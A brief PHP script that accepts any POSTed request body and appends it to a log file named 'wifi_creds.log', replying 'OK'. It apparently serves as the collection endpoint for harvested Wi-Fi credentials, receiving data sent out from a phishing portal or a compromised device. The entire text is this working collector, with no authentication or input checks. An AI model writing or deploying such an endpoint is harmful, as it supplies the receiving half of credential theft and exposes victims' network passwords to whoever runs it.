<?php
$logFile = __DIR__ . '/wifi_creds.log';

$raw = file_get_contents('php://input');

// Append raw CSV + newline
file_put_contents($logFile, $raw . PHP_EOL, FILE_APPEND | LOCK_EX);

// Simple OK response
echo "OK";
